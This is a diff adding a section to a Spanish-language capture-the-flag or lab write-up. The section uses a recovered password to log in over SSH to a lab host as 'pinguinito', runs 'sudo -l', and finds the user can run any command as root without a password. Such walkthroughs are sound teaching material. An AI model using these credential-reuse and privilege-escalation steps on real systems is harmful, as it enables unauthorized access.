@@ -164,3 +164,25 @@ Con el mismo filtro aplicado y observando la misma request buscamos la ejecució
 <Callout type="success" title="Nombre de usuario">
   pinguinito
 </Callout>
+
+Con la contraseña obtenida `Tr0pic4l-Pingu_99!` iniciamos sesión por SSH.
+
+```bash
+ssh pinguinito@172.17.0.2
+```
+
+Verificamos los permisos que tenemos con el usuario `pinguinito`.
+
+```bash
+sudo -l
+```
+
+```plaintext
+Matching Defaults entries for pinguinito on b481bf7a6f89:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User pinguinito may run the following commands on b481bf7a6f89:
+    (ALL) NOPASSWD: ALL
+```
+
+Podemos ejecutar cualquier comando como `root` sin contraseña.
